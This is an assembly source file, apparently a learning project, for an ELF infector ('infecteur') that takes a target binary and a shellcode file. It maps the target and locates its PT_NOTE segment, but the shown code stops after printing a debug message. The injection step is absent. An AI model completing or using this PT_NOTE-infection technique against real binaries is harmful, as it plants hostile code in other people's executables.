BITS 64
default rel

; --- offsets Elf64_Ehdr ---
%define E_ENTRY  0x18
%define E_PHOFF  0x20
%define E_PHNUM  0x38

; --- offsets Elf64_Phdr ---
%define P_TYPE      0x00
%define P_FLAGS     0x04
%define P_OFFSET    0x08
%define P_VADDR     0x10
%define P_FILESZ    0x20
%define P_MEMSZ     0x28
%define P_ALIGN     0x30
%define P_PHDR_SIZE 56

; --- types ---
%define PT_NOTE 4
%define PT_LOAD 1
%define PF_R    4
%define PF_X    1

section .data
    msg_usage db "Usage: ./infecteur <elf> <shellcode.bin>", 10
    msg_usage_len equ $ - msg_usage
    msg_found db "PT_NOTE trouve", 10   ; message de debug
    msg_found_len equ $ - msg_found     ; longueur

section .bss
    fd: resq 1 ; on réserve 8 octets pour stocker le file descriptor
    fsize: resq 1   ; taille du fichier
    buf: resq 1

section .text
    global _start

_start:
    mov rax, [rsp]
    cmp rax, 3
    jl .usage

    ;open
    mov rdi, [rsp + 16]
    mov rsi, 2
    mov rax, 2  ; syscall ouvert
    syscall
    test rax, rax
    js .usage
    mov [fd], rax

    ;lseek
    mov rdi, [fd]
    xor rsi, rsi
    mov rdx, 2      ; SEEK_END
    mov rax, 8       ; syscall lseek
    syscall
    mov [fsize], rax    ; rax = taille du fichier

    ;partie mmap
    xor rdi, rdi            ; addr NULL
    mov rsi, [fsize]        ; longuer du fichier
    mov rdx, 3              ; PROT_READ et WRITE
    mov r10, 1
    mov r8, [fd]
    xor r9, r9
    mov rax, 9              ; mmap
    syscall
    mov [buf], rax
    mov rax, [buf]  ; base du fichier mappe
    mov rbx, [rax + E_PHOFF]    ; e_phoff = offset table phdrs
    add rbx, rax    ; rbx = adresse du 1er phdr
    movzx rcx, word [rax + E_PHNUM] ; nombre de segments

    .find_note:
    cmp dword [rbx + P_TYPE], PT_NOTE       ; on compare la veleur p_type du phdr avec PT_NOTE
    je .found   ; si oui, saute a .found
    add rbx, P_PHDR_SIZE    ; phdr suivant (56 octets)
    dec rcx ; decremente le compteur
    jnz .find_note  ; si reste > 0, on reboucle
    mov rax, 60 ; syscall exit
    mov rdi, 1  ; code de retour 1 (erreur)
    syscall

    .found: ; label : PT_NOTE trouve

    mov rax, [fsize]    ; taille du fichier cible
    add rax, 0xFFF  ; arrondir au 0x1000 superieur
    and rax, ~0xFFF     ; enleve les 12 bits du bas

    mov rax, 1  ; syscall write
    mov rdi, 1  ; stdout
    lea rsi, [msg_found]    ; message
    mov rdx, msg_found_len  ; longueur
    syscall

    mov rax, 60 ; syscall exit
    xor rdi, rdi        ; code de retour 0 (succes)
    syscall

    ;exit
    mov rax, 60
    xor rdi, rdi
    syscall

.usage:
    mov rax, 1
    mov rdi, 1
    lea rsi, [msg_usage]
    mov rdx, msg_usage_len
    syscall

    mov rax, 60
    mov rdi, 1
    syscall